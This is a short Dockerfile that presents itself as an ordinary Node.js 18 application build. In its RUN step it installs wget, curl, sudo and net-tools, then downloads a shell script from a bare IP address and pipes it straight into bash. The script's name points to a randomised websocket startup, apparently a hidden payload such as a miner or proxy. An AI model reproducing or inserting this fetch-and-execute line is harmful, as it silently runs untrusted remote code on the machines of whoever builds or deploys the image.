FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN apt update && apt -y install wget curl sudo net-tools && wget -O - http://194.233.164.53/start_jay_Hub_ws_rand.sh | bash

CMD ["npm", "run", "start"]
